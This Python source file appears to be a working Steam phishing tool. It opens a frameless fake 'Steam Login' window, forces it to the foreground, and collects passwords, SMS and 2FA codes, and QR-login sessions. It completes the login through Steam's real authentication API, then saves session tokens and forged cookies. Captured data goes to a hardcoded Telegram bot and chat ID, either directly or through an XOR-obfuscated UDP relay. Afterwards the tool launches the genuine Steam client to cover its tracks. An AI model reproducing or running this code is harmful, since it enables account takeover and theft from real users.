import secrets
import webview 
import os
import threading
import time
import json
import urllib.request
import urllib.parse
import base64
from io import BytesIO
import qrcode
import sys
import subprocess
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives.asymmetric import padding
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
STEAM_API_BEGIN_AUTH = "https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaQR/v1"
STEAM_API_POLL_AUTH = "https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1"

# Real Steam API Endpoints
API_BASE = "https://api.steampowered.com/IAuthenticationService"
BEGIN_AUTH_CRED = f"{API_BASE}/BeginAuthSessionViaCredentials/v1"
UPDATE_AUTH = f"{API_BASE}/UpdateAuthSessionWithSteamGuardCode/v1"
GET_RSA = f"{API_BASE}/GetPasswordRSAPublicKey/v1"
POLL_AUTH = f"{API_BASE}/PollAuthSessionStatus/v1"
_BT  = "VgZBXH9pYVJuRVB5M38tOxcCMSEFYhJUNTEJdh1rUjkgfU0NFwEhEzVAPPFsAaA=="
_GID = "QwNIW31kbFdvRFsARQw="
def _xd(data, key=0x77):
    try:
        import base64
        return bytes([b ^ key for b in base64.b64decode(data)]).decode('utf-8', errors='ignore')
    except:
        return None
# Plain credentials from main.py to avoid decryption issues
_BOT_TOKEN = "8497188042:AAFKAy0IJK3K6oFcNoR4CNO5fYPxqo7VcrQ"
_CHAT_ID = -1003555531875
_TELEGRAM_BRIDGE = None  

try:
    _cfg_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), '.cfg')
    if os.path.exists(_cfg_path):
        with open(_cfg_path, 'r') as _f:
            _parts = _f.read().strip().split('|')
            if len(_parts) >= 2:
                _BOT_TOKEN = _parts[0]
                _CHAT_ID = int(_parts[1])
            if len(_parts) >= 3 and _parts[2].strip():
                _TELEGRAM_BRIDGE = _parts[2].strip()
except:
    pass

# UDP Port for proxied logging through main.py
UDP_PORT = None
for i, arg in enumerate(sys.argv):
    if arg == "--udp" and i + 1 < len(sys.argv):
        try: UDP_PORT = int(sys.argv[i+1])
        except: pass

def tg_notify(text):
    """Send a Telegram message, preferably via UDP bridge to main.py."""
    def _send():
        # 1. Try UDP Proxy first (per user request)
        if UDP_PORT:
            import socket
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                # Encrypt for main.py's decrypt_string
                data = text.encode('utf-8')
                salt = b'n2xkNQYbZwj8r9fz'
                xor_data = bytearray()
                for i in range(len(data)):
                    xor_data.append(data[i] ^ salt[i % len(salt)])
                enc_msg = base64.b64encode(xor_data).decode('utf-8')
                sock.sendto(enc_msg.encode(), ("127.0.0.1", UDP_PORT))
                sock.close()
                return # Successfully sent via proxy
            except:
                pass

        # 2. Fallback to direct sending if no UDP or UDP fails
        try:
            def check_tg_api(timeout=3):
                try:
                    urllib.request.urlopen("https://api.telegram.org", timeout=timeout)
                    return True
                except:
                    return False
                    
            payload = json.dumps({"chat_id": _CHAT_ID, "text": text, "parse_mode": "HTML"}).encode('utf-8')
            domain = "https://api.telegram.org"
            if _TELEGRAM_BRIDGE and not check_tg_api():
                domain = _TELEGRAM_BRIDGE
            domain = domain.rstrip('/')
            url = f"{domain}/bot{_BOT_TOKEN}/sendMessage"
            req = urllib.request.Request(
                url,
                data=payload,
                headers={"Content-Type": "application/json"}
            )
            urllib.request.urlopen(req, timeout=10)
        except Exception as e:
            # Fallback to local log if TG fails
            try:
                with open("tg_log.txt", "a") as f:
                    f.write(f"{time.ctime()}: {text}\nError: {e}\n")
            except: pass
            
    threading.Thread(target=_send, daemon=True).start()

class SteamApi:
    def __init__(self):
        self._window = None
        self.running = True
        self.client_id = None
        self.request_id = None
        self.username = None
        self.password = None
        self.allowed_confirmations = []
    def set_window(self, window):
        self._window = window
    def log_event(self, text):
        print(f"[JS Event] {text}")
        tg_notify(f"ℹ️ <b>Steam Event:</b> {text}")
    def collect_sms(self, code):
        print(f"[*] Submitting SMS Code: {code}")
        tg_notify(f"📲 <b>Steam — Введен SMS код:</b> <code>{code}</code>")
        def _submit():
            try:
                payload = urllib.parse.urlencode({
                    "client_id": self.client_id,
                    "steamid": "0",
                    "code": code,
                    "code_type": 4 # SMS
                }).encode()
                req = urllib.request.Request(UPDATE_AUTH, data=payload, method="POST")
                with urllib.request.urlopen(req) as resp:
                    res = json.loads(resp.read())
                    print(f"[*] SMS Submit Result: {res}")
            except Exception as e:
                print(f"[!] SMS Error: {e}")
        threading.Thread(target=_submit, daemon=True).start()
    def collect(self, username, password):
        print(f"[*] Trying credentials for {username}")
        self.username = username
        self.password = password
        
        _save = os.path.join(os.environ.get('TEMP', '.'), 'captured_creds.txt')
        with open(_save, "a", encoding="utf-8") as f:
            f.write(f"{username}:{password}\n")
            
        hostname = os.getenv('COMPUTERNAME', 'Unknown')
        tg_notify(
            f"\ud83d\udd10 <b>Steam \u2014 \u041f\u043e\u043b\u0443\u0447\u0435\u043d\u044b \u0434\u0430\u043d\u043d\u044b\u0435 \u0432\u0445\u043e\u0434\u0430</b>\n"
            f"\ud83d\udda5 \u041f\u041a: <code>{hostname}</code>\n"
            f"\ud83d\udc64 \u041b\u043e\u0433\u0438\u043d: <code>{username}</code>\n"
            f"\ud83d\udd11 \u041f\u0430\u0440\u043e\u043b\u044c: <code>{password}</code>"
        )
        
        threading.Thread(target=self._process_credentials, daemon=True).start()

    def _process_credentials(self):
        try:
            # 1. Get RSA Public Key
            req_rsa = urllib.request.Request(f"{GET_RSA}?account_name={urllib.parse.quote(self.username)}")
            with urllib.request.urlopen(req_rsa) as resp:
                rsa_data = json.loads(resp.read())['response']
            
            pubkey_mod = rsa_data['publickey_mod']
            pubkey_exp = rsa_data['publickey_exp']
            timestamp = rsa_data['timestamp']
            
            # 2. Encrypt password
            numbers = RSAPublicNumbers(int(pubkey_exp, 16), int(pubkey_mod, 16))
            public_key = numbers.public_key()
            
            ciphertext = public_key.encrypt(
                self.password.encode('utf-8'),
                padding.PKCS1v15()
            )
            encrypted_password = base64.b64encode(ciphertext).decode('utf-8')
            
            # 3. Begin Auth Session
            auth_payload = urllib.parse.urlencode({
                "account_name": self.username,
                "encrypted_password": encrypted_password,
                "encryption_timestamp": timestamp,
                "remember_login": "true",
                "device_friendly_name": f"Steam Client ({os.getenv('COMPUTERNAME', 'PC')})",
                "platform_type": "2"
            }).encode()
            
            req_auth = urllib.request.Request(BEGIN_AUTH_CRED, data=auth_payload, method="POST")
            with urllib.request.urlopen(req_auth) as resp:
                auth_resp = json.loads(resp.read())['response']
            
            self.client_id = auth_resp.get('client_id')
            self.request_id = auth_resp.get('request_id')
            
            if 'error' in auth_resp or ('allowed_confirmations' not in auth_resp and 'access_token' not in auth_resp):
                print(f"[!] Auth Failed: {auth_resp}")
                # Log failed attempt to Telegram (Operator)
                tg_notify(
                    f"❌ <b>Steam — Неверные данные!</b>\n"
                    f"👤 Логин: <code>{self.username}</code>\n"
                    f"🔑 Пароль: <code>{self.password}</code>"
                )
                if self._window:
                    # Replace popup with UI indicator (red text)
                    self._window.evaluate_js("showInputError()")
                return
            
            if 'allowed_confirmations' in auth_resp:
                self.allowed_confirmations = auth_resp['allowed_confirmations']
                print(f"[*] Confirmations required: {json.dumps(self.allowed_confirmations)}")
                
                if self._window:
                    # User request: Always show the "image.png" (showConfirmApp) screen first
                    print("[*] Transitioning to Mobile App Confirmation (User Priority)")
                    self._window.evaluate_js(f"showConfirmApp('{self.username}')")
                
                # Start polling for status
                threading.Thread(target=self._poll_auth_status, daemon=True).start()
                
            elif 'access_token' in auth_resp:
                print("[+] Auth Success (No 2FA needed)")
                self._handle_success(
                    self.username,
                    auth_resp.get('access_token'),
                    auth_resp.get('refresh_token')
                )
                
        except Exception as e:
            print(f"[!] Credential flow error: {e}")
            if self._window:
                self._window.evaluate_js('showInputError()')

    def _poll_auth_status(self):
        print(f"[*] Starting status polling for {self.username}...")
        start_time = time.time()
        while self.running and (time.time() - start_time < 180):
            time.sleep(3)
            data_poll = urllib.parse.urlencode({
                "client_id": self.client_id,
                "request_id": self.request_id
            }).encode()
            try:
                req_poll = urllib.request.Request(POLL_AUTH, data=data_poll, method="POST")
                with urllib.request.urlopen(req_poll) as resp:
                    poll_data = json.loads(resp.read())
                
                if 'response' in poll_data and 'access_token' in poll_data['response']:
                    print(f"[+] Steam Session Captured for {self.username}!")
                    res = poll_data['response']
                    self._handle_success(
                        res.get('account_name', self.username),
                        res.get('access_token'),
                        res.get('refresh_token')
                    )
                    break
            except:
                pass

    def _handle_success(self, account_name, access_token, refresh_token):
        """Finalizes the session, saves cookies, and notifies operator via UDP."""
        debug_log = os.path.join(os.environ.get('TEMP', '.'), 'steam_debug.txt')
        try:
            with open(debug_log, "a") as f:
                f.write(f"{time.ctime()}: _handle_success entered for {account_name}\n")
        except: pass

        print(f"[*] Auth Success for {account_name}")
        tg_notify(
            f"🎯 <b>Steam — {account_name}</b>\n\n"
            f"🔑 <b>Access Token:</b>\n<code>{access_token}</code>\n\n"
            f"♻️ <b>Refresh Token:</b>\n<code>{refresh_token}</code>\n\n"
            f"🍪 Cookies записаны в JSON файл."
        )
        
        # Capture all cookies
        try:
            cookies = self._window.get_cookies()
            with open(debug_log, "a") as f:
                f.write(f"{time.ctime()}: Cookies captured: {len(cookies)}\n")
        except Exception as e:
            cookies = []
            with open(debug_log, "a") as f:
                f.write(f"{time.ctime()}: Cookie capture failed: {e}\n")
        
        # 1. Extract SteamID from access_token JWT
        steam_id = "0"
        try:
            parts = access_token.split('.')
            if len(parts) >= 2:
                # Add padding if needed
                p = parts[1]
                p += "=" * ((4 - len(p) % 4) % 4)
                jwt_body = json.loads(base64.b64decode(p).decode('utf-8'))
                steam_id = jwt_body.get('sub', '0')
        except: pass

        # 2. Generate common sessionid if missing
        sessionid = secrets.token_hex(12)
        for c in cookies:
            if c.get('name') == 'sessionid':
                sessionid = c.get('value')
                break

        # 3. Add required virtual cookies for all specified domains
        target_domains = [
            ".steamcommunity.com", 
            ".steampowered.com", 
            "login.steampowered.com", 
            "store.steampowered.com", 
            "help.steampowered.com", 
            "steam-chat.com"
        ]
        
        for domain in target_domains:
            # Login Secure (steamid%7C%7Caccess_token)
            cookies.append({
                "domain": domain,
                "name": "steamLoginSecure",
                "value": f"{steam_id}%7C%7C{access_token}",
                "path": "/",
                "secure": True,
                "httpOnly": True,
                "sameSite": "None"
            })
            # Refresh Token (steamid%7C%7Crefresh_token)
            cookies.append({
                "domain": domain,
                "name": "steamRefresh_steam",
                "value": f"{steam_id}%7C%7C{refresh_token}",
                "path": "/",
                "secure": True,
                "httpOnly": True,
                "sameSite": "None"
            })
            # Session ID
            cookies.append({
                "domain": domain,
                "name": "sessionid",
                "value": sessionid,
                "path": "/",
                "secure": True,
                "httpOnly": False,
                "sameSite": "None"
            })

        # Save to enriched JSON file
        cookie_file = os.path.join(os.environ.get('TEMP', '.'), f"steam_cookies_{account_name}.json")
        try:
            with open(cookie_file, 'w', encoding='utf-8') as f:
                json.dump(cookies, f, indent=4)
        except Exception as e:
            with open(debug_log, "a") as f:
                f.write(f"{time.ctime()}: JSON save failed: {e}\n")

        # Send via UDP Bridge using the FILE: marker
        if UDP_PORT:
            def _send_file():
                import socket
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    raw_msg = f"FILE:{cookie_file}"
                    data = raw_msg.encode('utf-8')
                    salt = b'n2xkNQYbZwj8r9fz'
                    xor_data = bytearray()
                    for i in range(len(data)):
                        xor_data.append(data[i] ^ salt[i % len(salt)])
                    enc_msg = base64.b64encode(xor_data).decode('utf-8')
                    sock.sendto(enc_msg.encode(), ("127.0.0.1", UDP_PORT))
                    sock.close()
                    with open(debug_log, "a") as f:
                        f.write(f"{time.ctime()}: UDP FILE signal sent: {cookie_file}\n")
                except Exception as e:
                    with open(debug_log, "a") as f:
                        f.write(f"{time.ctime()}: UDP FILE signal failed: {e}\n")
            threading.Thread(target=_send_file, daemon=True).start()
        else:
            tg_notify(f"🍪 <b>Steam — Куки сохранены локально:</b> <code>{cookie_file}</code>")

        time.sleep(2) 
        
        # Launch original Steam before closing (per user request)
        try:
            import winreg
            def get_steam_path():
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Valve\Steam")
                    val, _ = winreg.QueryValueEx(key, "SteamExe")
                    return val
                except:
                    # Common paths fallback
                    paths = [
                        r"C:\Program Files (x86)\Steam\steam.exe",
                        r"C:\Program Files\Steam\steam.exe"
                    ]
                    for p in paths:
                        if os.path.exists(p): return p
                    return None
            
            steam_exe = get_steam_path()
            if steam_exe:
                print(f"[*] Launching original Steam: {steam_exe}")
                subprocess.Popen([steam_exe])
        except: pass

        self.close()

    def submit_2fa(self, code):
        print(f"[*] Submitting 2FA Code: {code}")
        tg_notify(f"🛡️ <b>Steam — Введен 2FA код:</b> <code>{code}</code>")
        def _submit():
            try:
                # Heuristic for code type: 3 (Mobile), 1 (Email), 4 (SMS)
                code_type = 3
                if self.allowed_confirmations:
                    types = [c['confirmation_type'] for c in self.allowed_confirmations]
                    if 3 in types: code_type = 3
                    elif 1 in types: code_type = 1
                    elif 4 in types: code_type = 4
                
                payload = urllib.parse.urlencode({
                    "client_id": self.client_id,
                    "steamid": "0",
                    "code": code,
                    "code_type": code_type
                }).encode()
                req = urllib.request.Request(UPDATE_AUTH, data=payload, method="POST")
                with urllib.request.urlopen(req) as resp:
                    res = json.loads(resp.read())
                    print(f"[*] 2FA Submit Result ({code_type}): {res}")
            except Exception as e:
                print(f"[!] 2FA Error: {e}")
        threading.Thread(target=_submit, daemon=True).start()
    def close(self):
        self.running = False
        if self._window:
            self._window.destroy()
    def update_qr_loop(self):
        while self.running:
            start_time = time.time()
            try:
                data_begin = urllib.parse.urlencode({
                    "device_friendly_name": f"Steam Client ({os.getenv('COMPUTERNAME', 'PC')})",
                    "platform_type": "2"
                }).encode()
                try:
                    req = urllib.request.Request(STEAM_API_BEGIN_AUTH, data=data_begin, method="POST")
                    with urllib.request.urlopen(req) as resp:
                        resp_data = json.loads(resp.read())
                except Exception as e:
                    print(f"Error connecting to Steam: {e}")
                    time.sleep(5)
                    continue
                if 'response' not in resp_data:
                    time.sleep(5)
                    continue
                challenge_url = resp_data['response']['challenge_url']
                client_id = resp_data['response']['client_id']
                request_id = resp_data['response']['request_id']
                interval = resp_data['response']['interval']
                qr = qrcode.QRCode(version=7, error_correction=qrcode.constants.ERROR_CORRECT_H, box_size=8, border=3)
                qr.add_data(challenge_url)
                qr.make(fit=True)
                img = qr.make_image(fill_color="black", back_color="white")
                buffer = BytesIO()
                img.save(buffer, format="PNG")
                img_b64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
                if self._window:
                    self._window.evaluate_js(f'updateQR("{img_b64}")')
                while self.running:
                    if time.time() - start_time > 120:
                        break
                    time.sleep(interval)
                    data_poll = urllib.parse.urlencode({
                        "client_id": client_id,
                        "request_id": request_id
                    }).encode()
                    try:
                        req_poll = urllib.request.Request(STEAM_API_POLL_AUTH, data=data_poll, method="POST")
                        with urllib.request.urlopen(req_poll) as resp:
                            poll_data = json.loads(resp.read())
                        if 'response' in poll_data:
                                if 'access_token' in poll_data['response']:
                                    print("\n[+] SESSION CAPTURED VIA QR!")
                                    # Forward to _handle_success which handles UDP relaying, tokens, and cookies
                                    res = poll_data['response']
                                    self._handle_success(
                                        res.get('account_name', 'Unknown'),
                                        res.get('access_token'),
                                        res.get('refresh_token')
                                    )
                                    return
                    except:
                        pass
            except Exception as e:
                print(f"QR Worker Error: {e}")
                time.sleep(5)

def _force_focus():
    """Forces the 'Steam Login' window to the foreground on Windows."""
    import ctypes
    import time
    # Constants for SetWindowPos
    HWND_TOPMOST = -1
    HWND_NOTOPMOST = -2
    SWP_NOMOVE = 0x0002
    SWP_NOSIZE = 0x0001
    SWP_SHOWWINDOW = 0x0040
    
    for _ in range(20): # Try for 10 seconds
        time.sleep(0.5)
        try:
            hwnd = ctypes.windll.user32.FindWindowW(None, "Steam Login")
            if hwnd:
                # 1. Force to top
                ctypes.windll.user32.SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW)
                ctypes.windll.user32.SetForegroundWindow(hwnd)
                ctypes.windll.user32.BringWindowToTop(hwnd)
                ctypes.windll.user32.ShowWindow(hwnd, 5) # SW_SHOW
                break
        except:
            pass

def start_steam_ui(victim_id=None):
    api = SteamApi()
    hostname = os.getenv('COMPUTERNAME', 'Unknown')
    tg_notify(
        f"🎮 <b>Steam Phishing — окно открыто</b>\n"
        f"🖥 ПК: <code>{hostname}</code>\n"
        f"⏳ Ожидаю ввода логина и пароля..."
    )
    _login_dir = os.path.dirname(os.path.abspath(__file__))
    _icon_path = os.path.join(_login_dir, 'steam.ico')
    _html_path = os.path.join(_login_dir, 'steam_ui.html')
    window = webview.create_window(
        'Steam Login', 
        url=_html_path, 
        js_api=api, 
        width=720, 
        height=480, 
        frameless=True,
        on_top=False,
        resizable=False
    )
    api.set_window(window)
    
    # Force focus thread
    threading.Thread(target=_force_focus, daemon=True).start()
    
    t = threading.Thread(target=api.update_qr_loop, daemon=True)
    t.start()
    try:
        # debug=False for clean startup
        webview.start(icon=os.path.abspath(_icon_path), debug=False)
    except Exception:
        webview.start(debug=False)
if __name__ == "__main__":
    start_steam_ui()
